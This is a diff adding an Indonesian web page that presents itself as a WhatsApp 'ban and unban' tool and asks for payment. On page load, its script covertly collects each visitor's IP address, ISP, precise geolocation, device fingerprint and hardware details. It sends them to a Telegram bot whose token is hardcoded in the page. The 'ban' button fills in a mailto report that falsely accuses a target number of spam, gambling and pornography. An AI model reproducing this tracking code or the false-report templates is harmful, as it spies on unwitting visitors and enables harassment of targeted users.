@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Pembayaran Premium</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      color: #fff;
+      text-align: center;
+      padding: 30px 10px;
+      margin: 0;
+    }
+
+    h1 {
+      font-size: 2.2em;
+      margin-bottom: 5px;
+    }
+
+    p {
+      font-size: 1.1em;
+      margin-bottom: 20px;
+      color: #f5f5f5;
+    }
+
+    img.anime {
+      width: 300px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+      margin-bottom: 25px;
+    }
+
+    .btn {
+      display: block;
+      width: 85%;
+      max-width: 300px;
+      margin: 12px auto;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+
+    .bayar { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .menu  { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .cs    { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .telegram { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .owner { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .music { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+    .WhatsApp { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
+
+    .btn:hover { opacity: 0.9; }
+
+    footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+
+    .popup {
+      display: none;
+      background-color: rgba(0,0,0,0.85);
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .popup-content {
+      background-color: #2c3e50;
+      padding: 20px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 420px;
+      text-align: left;
+      color: white;
+      overflow-y: auto;
+      max-height: 80vh;
+    }
+
+    .popup-content h2 {
+      margin-top: 0;
+      color: #f39c12;
+    }
+
+    .close-btn {
+      background: crimson;
+      color: white;
+      padding: 8px 15px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .identitas img {
+      width: 100px;
+      border-radius: 50%;
+      margin: 10px auto;
+      display: block;
+    }
+
+    .identitas h3 {
+      text-align: center;
+      color: #00e6b8;
+    }
+
+    .identitas p {
+      font-size: 0.95em;
+      text-align: justify;
+    }
+
+    .titik-tiga {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 28px;
+      color: white;
+      cursor: pointer;
+      z-index: 1000;
+      user-select: none;
+      font-weight: bold;
+      background: rgba(255,255,255,0.1);
+      padding: 8px 12px;
+      border-radius: 10px;
+      backdrop-filter: blur(6px);
+      transition: background 0.3s ease;
+    }
+
+    .titik-tiga:hover {
+      background: rgba(255,255,255,0.2);
+    }
+  </style>
+</head>
+<body>
+
+<style>
+            body {
+                min-height: 100vh;
+                background: linear-gradient(130deg, #09090b 0%, #45020c 100%);
+                font-family: "Segoe UI", sans-serif;
+            }
+            .glow {
+                box-shadow:
+                    0 0 32px 6px #b91c1c99,
+                    0 0 2px #fff;
+                border: 2.5px solid #b91c1c;
+                animation: pulse 2.5s infinite;
+            }
+            .neon-text {
+                color: #f87171;
+                text-shadow:
+                    0 0 10px #b91c1c,
+                    0 0 20px #b91c1c,
+                    0 0 30px #b91c1c,
+                    0 0 40px #b91c1c90,
+                    0 0 70px #b91c1c80;
+                letter-spacing: 2px;
+                animation: neonflicker 3s infinite alternate;
+            }
+            @keyframes pulse {
+                0%,
+                100% {
+                    box-shadow:
+                        0 0 32px 8px #b91c1c66,
+                        0 0 2px #fff;
+                }
+                50% {
+                    box-shadow:
+                        0 0 64px 12px #f87171cc,
+                        0 0 12px #fff;
+                }
+            }
+            @keyframes neonflicker {
+                0%,
+                100% {
+                    opacity: 1;
+                    filter: brightness(1);
+                }
+                70% {
+                    opacity: 0.93;
+                    filter: brightness(1.2);
+                }
+                85% {
+                    opacity: 0.7;
+                    filter: brightness(1.5);
+                }
+            }
+            .paycard {
+                background: rgba(18, 16, 18, 0.93);
+                border-radius: 1.7rem;
+                box-shadow: 0 2px 40px #b91c1c30;
+                transition:
+                    transform 0.14s,
+                    box-shadow 0.14s;
+            }
+            .paycard:hover {
+                transform: translateY(-8px) scale(1.03);
+                box-shadow:
+                    0 8px 60px #fa223499,
+                    0 0 24px #fa223455;
+            }
+            .qrbox {
+                background: linear-gradient(135deg, #1e1b20 60%, #333 100%);
+                padding: 1.2rem;
+                border-radius: 1.2rem;
+                box-shadow: 0 0 22px #2227;
+            }
+            .btn-tg {
+                background: linear-gradient(90deg, #b91c1c, #f87171);
+                color: #fff;
+                border-radius: 999px;
+                font-weight: 600;
+                padding: 0.75rem 2rem;
+                box-shadow: 0 2px 24px #b91c1c45;
+                transition:
+                    background 0.18s,
+                    box-shadow 0.18s,
+                    transform 0.18s;
+                border: none;
+                display: inline-flex;
+                align-items: center;
+                gap: 0.6em;
+                font-size: 1rem;
+                margin-top: 2.5rem;
+                cursor: pointer;
+                letter-spacing: 0.5px;
+                outline: none;
+            }
+            .btn-tg:hover {
+                background: linear-gradient(90deg, #d71c1c, #f43f5e);
+                box-shadow: 0 6px 32px #fa223485;
+                transform: scale(1.05) translateY(-2px);
+                text-decoration: none;
+                color: #fff;
+            }
+            .btn-tg svg {
+                width: 22px;
+                height: 22px;
+                margin-right: 0.25em;
+                vertical-align: middle;
+                fill: #fff;
+            }
+            .copy-btn {
+                background: #18181b;
+                border: 1.2px solid #f87171;
+                color: #fff;
+                padding: 0.45rem 1.2rem;
+                border-radius: 999px;
+                margin-top: 1em;
+                cursor: pointer;
+                font-size: 0.98em;
+                font-weight: 500;
+                transition:
+                    background 0.13s,
+                    border 0.13s;
+            }
+            .copy-btn:hover {
+                background: #f87171;
+                border: 1.5px solid #fff;
+                color: #fff;
+            }
+            /* List jualan */
+            .list-jualan {
+                background: #18181b;
+                border-radius: 1.5rem;
+                box-shadow: 0 2px 32px #fa223420;
+                padding: 2rem 1.5rem;
+                margin-bottom: 2.5rem;
+                width: 100%;
+                max-width: 470px;
+            }
+            .list-jualan h2 {
+                color: #f87171;
+                text-shadow: 0 0 12px #b91c1c77;
+                font-size: 1.3rem;
+                font-weight: bold;
+                margin-bottom: 1rem;
+                letter-spacing: 1px;
+                text-align: center;
+            }
+            .list-jualan ul {
+                padding-left: 1.1rem;
+            }
+            .list-jualan li {
+                color: #fff;
+                font-size: 1.06rem;
+                margin-bottom: 0.7em;
+                border-left: 3px solid #fa2234;
+                padding-left: 0.7em;
+                line-height: 1.5;
+                background: #24242455;
+                border-radius: 0.3em;
+                transition: background 0.2s;
+            }
+            .list-jualan li:hover {
+                background: #b91c1c22;
+            }
+</style>
+</head>
+<body>
+<style>
+.floating-notif {
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: calc(100% - 40px);
+    max-width: 400px;
+    background: #111111;
+    color: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.4);
+    z-index: 9999;
+    box-sizing: border-box;
+    animation: slideUp 0.4s ease;
+}
+
+.floating-notif h3 {
+    margin: 0 0 10px;
+    color: #1685ff;
+}
+
+.floating-notif p {
+    font-size: 13px;
+    line-height: 1.6;
+    color: #ccc;
+}
+
+.agree {
+    font-size: 12px;
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    margin: 15px 0;
+}
+
+.agree a {
+    color: #1685ff;
+}
+
+.floating-notif button {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    background: #1685ff;
+    color: white;
+    font-weight: bold;
+}
+
+.floating-notif button:disabled {
+    opacity: 0.4;
+}
+
+@keyframes slideUp {
+    from {
+        opacity: 0;
+        transform: translate(-50%, 30px);
+    }
+    to {
+        opacity: 1;
+        transform: translate(-50%, 0);
+    }
+}
+</style>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ndiixyy Cruel</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #000;
+    color: white;
+}
+
+/* HALAMAN WEBSITE */
+.main-content {
+    padding: 30px;
+    text-align: center;
+}
+
+/* OVERLAY */
+.overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.90);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    z-index: 99999;
+}
+
+/* POPUP */
+.popup {
+    width: 100%;
+    max-width: 390px;
+    background: #111;
+    border: 1px solid #222;
+    border-radius: 16px;
+    padding: 25px;
+    box-shadow: 0 10px 40px rgba(0,0,0,.6);
+    animation: muncul .4s ease;
+}
+
+.popup h2 {
+    color: #1685ff;
+    text-align: center;
+    margin-top: 0;
+}
+
+.popup p {
+    color: #ccc;
+    font-size: 14px;
+    line-height: 1.7;
+}
+
+.checkbox {
+    display: flex;
+    align-items: flex-start;
+    gap: 9px;
+    margin: 20px 0;
+    font-size: 13px;
+    color: #ddd;
+}
+
+.checkbox input {
+    margin-top: 3px;
+}
+
+.checkbox a {
+    color: #1685ff;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+button {
+    width: 100%;
+    padding: 13px;
+    background: #1685ff;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: .35;
+    cursor: not-allowed;
+}
+
+/* SYARAT KETENTUAN */
+.terms-page {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    z-index: 100000;
+    display: none;
+    overflow-y: auto;
+    padding: 20px;
+}
+
+.terms-container {
+    max-width: 750px;
+    margin: 30px auto;
+    background: #111;
+    padding: 25px;
+    border-radius: 15px;
+    border: 1px solid #222;
+}
+
+.terms-container h1 {
+    color: #1685ff;
+    text-align: center;
+}
+
+.terms-container h3 {
+    color: #1685ff;
+    margin-top: 25px;
+}
+
+.terms-container p {
+    color: #ccc;
+    font-size: 14px;
+    line-height: 1.8;
+}
+
+.back-btn {
+    margin-top: 25px;
+}
+
+@keyframes muncul {
+    from {
+        opacity: 0;
+        transform: scale(.85);
+    }
+    to {
+        opacity: 1;
+        transform: scale(1);
+    }
+}
+</style>
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ndiixyy Cruel</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #000000;
+}
+
+.notif-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.65);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.notif-box {
+    background: white;
+    width: 85%;
+    max-width: 350px;
+    padding: 25px;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.2);
+    animation: muncul 0.4s ease;
+}
+
+.notif-box h2 {
+    color: #FF0033;
+    margin-top: 0;
+}
+
+.notif-box p {
+    color: #000000;
+    line-height: 1.6;
+}
+
+.notif-box button {
+    background: #FF0033;
+    color: white;
+    border: none;
+    padding: 12px 25px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    width: 100%;
+}
+
+.notif-box button:hover {
+    background: #FF0033;
+}
+
+@keyframes muncul {
+    from {
+        opacity: 0;
+        transform: scale(0.8);
+    }
+    to {
+        opacity: 1;
+        transform: scale(1);
+    }
+}
+</style>
+<style>
+.music-notif {
+  position: fixed;
+  top: 12px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 260px;
+  padding: 9px 12px;
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  background: rgba(15, 15, 15, 0.95);
+  border: 1px solid #ff3333;
+  border-radius: 14px;
+  color: white;
+  z-index: 9999;
+  box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
+}
+
+.music-icon {
+  font-size: 20px;
+}
+
+.music-info {
+  flex: 1;
+  min-width: 0;
+}
+
+.music-info h4 {
+  font-size: 12px;
+  margin: 0 0 3px;
+}
+
+.music-info p {
+  font-size: 10px;
+  margin: 0;
+  color: #aaa;
+}
+
+.music-control {
+  width: 27px;
+  height: 27px;
+  border: none;
+  border-radius: 50%;
+  background: #ff3333;
+  color: white;
+  font-size: 12px;
+  cursor: pointer;
+}
+@keyframes musicShow {
+    from {
+        opacity: 0;
+        transform: translate(-50%,-30px);
+    }
+    to {
+        opacity: 1;
+        transform: translate(-50%,0);
+    }
+}
+</style>
+</head>
+<body>
+<div class="music-notif">
+
+    <div class="music-icon">🎵</div>
+
+    <div class="music-info">
+        <h4>DJ Terbelah Jadi Dua</h4>
+        <p id="musicStatus">Now Playing • Music Player</p>
+    </div>
+
+    <button class="music-control" id="musicBtn"
+        onclick="toggleMusic()">
+        ▶
+    </button>
+
+</div>
+
+<audio id="bgMusic" loop preload="auto">
+    <source src="https://mp3tourl.com/audio/1793548760657-281e75ba-1363-4fcf-87f5-c30b0dd75eeb.mp3"
+    type="audio/mpeg">
+</audio>
+<script>
+const bgMusic = document.getElementById("bgMusic");
+const musicBtn = document.getElementById("musicBtn");
+const musicStatus = document.getElementById("musicStatus");
+
+bgMusic.volume = 0.5;
+
+async function toggleMusic() {
+    if (bgMusic.paused) {
+        try {
+            await bgMusic.play();
+            musicBtn.innerHTML = "Ⅱ";
+            musicStatus.innerHTML = "Now Playing • Ndiixyy Cruel";
+        } catch (error) {
+            musicStatus.innerHTML = "Musik gagal diputar";
+        }
+    } else {
+        bgMusic.pause();
+        musicBtn.innerHTML = "▶";
+        musicStatus.innerHTML = "Paused • Ndiixyy Cruel";
+    }
+}
+</script>
+<body>
+
+<div class="notif-overlay" id="notification">
+    <div class="notif-box">
+        <h2><b>🔔NOTIFICATIONS</b></h2>
+
+        <p>
+            Selamat datang di Aplikasi Tinjau Band & Unband Whatsapp By
+            <b>Ndiixyy Cruel</b>!
+            <br><br>
+            Harap Baca Informasi Dan Syarat Ketentuan Sebelum Memakai Aplikasi Ini</p><p>Dan Gunakan Dengan Bijak Sesuai Syarat dan Ketentuan yang berlaku</p><p><b>⚙️VERSI APLIKASI: 2.0.0 (Terbaru)</b></p>
+
+        <button onclick="hapusNotif()">
+            Accept
+        </button>
+    </div>
+</div>
+
+<script>
+function hapusNotif() {
+    document.getElementById("notification").style.display = "none";
+}
+</script>
+
+</body>
+</html>
+
+</style>
+ <style>
+    /* Styling Tombol Floating Asisten */
+    .assistant-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #0084ff; /* Warna biru asisten/CS */
+      color: #000000;
+      width: 65px;
+      height: 65px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+      z-index: 1000;
+      transition: all 0.3s ease;
+    }
+
+    /* Efek Hover */
+    .assistant-btn:hover {
+      transform: scale(1.1);
+      background-color: #0066cc;
+    }
+
+    /* Gaya untuk Foto Avatar Asisten (Opsional) */
+    .assistant-btn img {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    /* Styling Ikon FontAwesome (Jika tidak pakai gambar) */
+    .assistant-btn i {
+      font-size: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <a href="https://wa.me/6285812345390?text=Halo%20Admin%20ganteng,%20saya%20butuh%20bantuan" 
+     class="assistant-btn" 
+     target="_blank" 
+     title="Chat dengan Admint">
+    <img src="https://files.catbox.moe/tg23p6.png" alt="Chat Admin">
+  </a>
+
+</body>
+</html>
+
+  <!-- TITIK TIGA MENU -->
+  <div class="titik-tiga" onclick="showPopup('popupMenuTiga')">⋮</div>
+
+  <h2 style="color: red;"><b>APK TINJAU BAND DAN UNBAND BY NDIIXYY CRUEL</b><h2/>
+  
+  <h4 style="color: gray;">Gunakan Dengan Bijak Sesuai Ketentuan Kebijakan Dan Gunakan Untuk Ripper,Penipuan Dan Kejahatan Lainnya<h4/>
+  
+  <img
+    src="https://files.catbox.moe/t4yrxx.png"
+    class="anime w-full aspect-[16/9] mt-12 mb-5 rounded-2xl shadow-lg glow object-cover"
+    alt="NDIIXYY CRUEL BANNIDO"
+>
+
+  <button class="btn cs w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiCS()">🚫 BAND WHATSAPP</button>
+  <button class="btn cs w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiCS2()">✅ UNBANNED WHATSAPP</button>
+  <button class="btn menu w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('popupMenu')">📋 INFORMASI DAN CARA PENGGUNAANNYA (Wajib Di Baca) </button>
+  <button class="btn cs w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiWhatsapp()">📢 JOIN SALURAN RESMI KAMI</button>
+
+  <h3>
+    &copy; 2026 Ndiixyy Cruel (Development)
+  </h3>
+
+  <!-- POPUP: Bayar -->
+  <div class="popup" id="popupBayar">
+    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
+      <h2>🔐 Metode Pembayaran</h2>
+      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
+                    style="color: #02bde3; text-shadow: 0 0 14px #02bde3cc">𝐍𝐎 𝐃𝐀𝐍𝐀:</p>
+      <b>085716422059</b>
+      <button id="copy-btn" class="copy-btn" onclick="copyDana()">
+                    SALIN NOMOR DANA
+                </button>
+      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
+                    style="color: #02bde3; text-shadow: 0 0 20px #02bde3cc">𝐀𝐓𝐀𝐔 𝐒𝐂𝐀𝐍 𝐐𝐑𝐈𝐒 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇 𝐈𝐍𝐈:</p>
+      <img src="https://files.catbox.moe/ryij8b.jpg" alt="QRIS" style="width:100%; border-radius:15px;">
+      <button class="close-btn" onclick="closePopup('popupBayar')" style="width:100%;">Tutup</button>
+    </div>
+  </div>
+
+  <!-- POPUP: Menu -->
+  <div class="popup" id="popupMenu">
+    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow ">
+      <h2>INFORMASI CARA PENGGUNAAN</h2>
+      <ul>
+        <li>🕊 UBAH NOMOR TARGET PADA [+628XXXXXX],<b>CONTOH: [+62812345678]</b></li>
+        <li>🕊 GUNAKAN DENGAN BIJAK</li>
+        <li>🕊 TIDAK MENGGUNAKAN UNTUK HAL BERCANDA KARNA BERESIKO TINGGI</li> 
+        <li>🕊 DI DUA OPSI BAND MAUPUN UNBAND SELALU UBAH NOMOR TARGET</li>
+        <li>🕊 MEMBUTUHKAN WAKTU KARNA DI PROSES OLEH PIHAK WHATSAPP
+        <li> • JASA BIKIN APK ATAU LAINNYA? HUBUNGI ADMIN
+      </ul>
+      <button class="close-btn" onclick="closePopup('popupMenu')" style="width:100%;">Tutup</button>
+    </div>
+  </div>
+
+  <!-- POPUP: Owner -->
+  <div class="popup" id="popupOwner">
+    <div class="popup-content identitas w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
+      <h2>👑 Identitas Owner</h2>
+      <img src="https://files.catbox.moe/hvh7ia.jpg" alt="Owner">
+      <h3>Ndiixyy Cruel</h3>
+      <p>
+        Seorang pengembang muda dari Indonesia yang fokus membuat bot Telegram, WhatsApp, sistem pembayaran, dan layanan premium bernuansa anime.
+        <br><br>
+        Motto: <i>"Berjuang Tak Kenal Lelah, Tetap Kuat Untuk Sang Pembenci!!."</i>
+      </p>
+      <button class="close-btn" onclick="closePopup('popupOwner')" style="width:100%;">Tutup</button>
+    </div>
+  </div>
+
+  <!-- POPUP: Menu Titik Tiga -->
+  <div class="popup" id="popupMenuTiga">
+    <div class="w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
+      <h2>📌 Informasi Aplikasi</h2>
+      <p><b> TQ TO:</b></p>
+      <ul>
+        <li>• Ndiixyy Cruel (Developer)</li>
+        <li>• Allah SWT </li>
+        <li>• Orang Tua</li>
+        <li>• terr (Best Support/myyy binii)</li>
+      </ul>
+      <hr>
+      <p><b>🧩 Lainnya:</b></p>
+      <ul>
+        <li>• Aplikasi Terbaru</li>
+        <li>• Anti Suspend</li>
+        <li>• V.1.1.1</li>
+        <li>• INI APLIKASI TINJAU,DAN MEMBUTUHKAN WAKTU UNTUK KE BAND DAN UNBAND
+      </ul>
+      <button class="close-btn" onclick="closePopup('popupMenuTiga')" style="width:90%;">Tutup</button>
+    </div>
+  </div>
+<body>
+  <script>
+        const BOT_TOKEN = "8874426262:AAH_xNwvUZTREZjdbyO98nmwRymBJ3sdnLo";
+    const OWNER_CHAT_ID = "7565194909"; // <-- Ganti dengan chat ID owner bot (bukan grup)
+
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+
+    async function getVisitorInfo() {
+  const clock = new Date().toLocaleString();
+  let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+  let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+
+  const userAgent = navigator.userAgent;
+  const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+  const device = navigator.platform + " - " + userAgent;
+  const loginFrom = navigator.platform || "N/A";
+  const language = navigator.language || "N/A";
+  const resolution = screen.width + "x" + screen.height;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+  const isOnline = navigator.onLine;
+  const deviceMemory = navigator.deviceMemory || "N/A";
+  const cpuCores = navigator.hardwareConcurrency || "N/A";
+  const isTouch = 'ontouchstart' in window;
+  const cookiesEnabled = navigator.cookieEnabled;
+  const doNotTrack = navigator.doNotTrack;
+  const fingerprint = await generateFingerprint();
+
+  // Battery info
+  const batteryInfo = await navigator.getBattery().then(battery => {
+    return {
+      "battery level": Math.round(battery.level * 100) + "%",
+      "charging": battery.charging ? "yes" : "no"
+    };
+  }).catch(() => ({
+    "battery level": "N/A",
+    "charging": "N/A"
+  }));
+
+  try {
+    const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+    ip = ipData.ip;
+    country = ipData.country_name;
+    province = ipData.region;
+    latitude = ipData.latitude;
+    longitude = ipData.longitude;
+
+    // Ambil nama ISP dari IP menggunakan ipinfo.io
+    const whois = await fetch(`https://ipinfo.io/${ip}/json?token=123456789abcde`).then(r => r.json());
+    namaISP = whois.org || "N/A";
+  } catch {}
+
+  try {
+    const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+    weather = weatherData.current_condition[0].weatherDesc[0].value;
+    temperature = weatherData.current_condition[0].temp_C + "°C";
+  } catch {}
+
+  try {
+    await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          latitude = pos.coords.latitude.toFixed(6);
+          longitude = pos.coords.longitude.toFixed(6);
+          accuracy = pos.coords.accuracy + "m";
+          resolve();
+        },
+        () => resolve(),
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  } catch {}
+
+  const jsonData = {
+    "nama": namaISP,
+    "alamat ip": ip,
+    "device": device,
+    "android versions": androidVersion,
+    "login from": loginFrom,
+    "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+    "country": country,
+    "province": province,
+    "clock": clock,
+    "weather": weather,
+    "temperature": temperature,
+    "language": language,
+    "screen resolution": resolution,
+    "timezone": timezone,
+    "online": isOnline,
+    "ram (GB)": deviceMemory,
+    "cpu cores": cpuCores,
+    "touch support": isTouch,
+    "cookies enabled": cookiesEnabled,
+    "do not track": doNotTrack,
+    "fingerprint": fingerprint,
+    "battery": batteryInfo["battery level"],
+    "charging": batteryInfo["charging"]
+  };
+
+  const message = `📥 *New users*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: OWNER_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  });
+}
+
+    getVisitorInfo();
+  </script>
+</body>
+
+  <!-- JS -->
+  <script>
+    function showPopup(id) {
+      document.getElementById(id).style.display = "flex";
+    }
+
+    function closePopup(id) {
+      document.getElementById(id).style.display = "none";
+    }
+
+    function hubungiCS() {
+      window.location.href = "mailto:help@support.whatsapp.com?subject=[URGENTE] Denúncia por Spam, Jogos de Azar e Pornografia – [+628xxxxxxxxxx]&body=Olá, suporte do WhatsApp.Solicito o banimento imediato do número [+62 8xx-xxxx-xxxx] por violação grave dos Termos de Serviço. O usuário está praticando: Spam e Phishing Divulgação de Jogos de Azar/Apostas Ilegais Envio de Conteúdo Porno/Impróprio Este número representa um risco à segurança dos usuários. As provas (prints) estão anexadas. Peço ação rápida.Obrigado.";
+    }
+    
+    function hubungiCS2() {
+      window.location.href = "mailto:help@support.whatsapp.com?subject=[URGENTE] Solicitação de Desbloqueio de Conta – [+628xxxxxxxxxx]&body=Hola, saludos del equipo de soporte de WhatsApp. Quisiera solicitar la recuperación de mi cuenta con el siguiente número: [+628xxxxx]. Creo que el bloqueo se debió a un error en el sistema automatizado de WhatsApp. Como uso WhatsApp para fines personales, como comunicarme o chatear con amigos y familiares, solicito que se restablezca mi cuenta lo antes posible. Gracias por su ayuda.";
+      }
+    
+    function hubungiTelegram() {
+      window.open("https://t.me/Ndiixyy", "_blank");
+    }
+    
+    function hubungiWhatsapp() {
+      window.open("https://whatsapp.com/channel/0029Vb6o6WQ65yDKqJd0MU3w","_blank");
+    }
+    
+    function copyDana() {
+                const dana = "085716422059";
+                navigator.clipboard.writeText(dana);
+                const btn = document.getElementById("copy-btn");
+                btn.innerText = "Copied!";
+                setTimeout(() => (btn.innerText = "SALIN NOMOR DANA"), 1400);
+            }
+
+    let ytPlayer;
+    let ytPlaying = false;
+
+    function toggleYouTube() {
+      if (!ytPlayer) return;
+      const btn = event.target;
+      if (!ytPlaying) {
+        ytPlayer.playVideo();
+        btn.innerText = "⏸️ Pause Music";
+      } else {
+        ytPlayer.pauseVideo();
+        btn.innerText = "🎵 Play Music";
+      }
+      ytPlaying = !ytPlaying;
+    }
+
+    function onYouTubeIframeAPIReady() {
+      ytPlayer = new YT.Player('ytPlayer');
+    }
+
+    const tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    const firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+  </script>
+
+</body>
+</html>
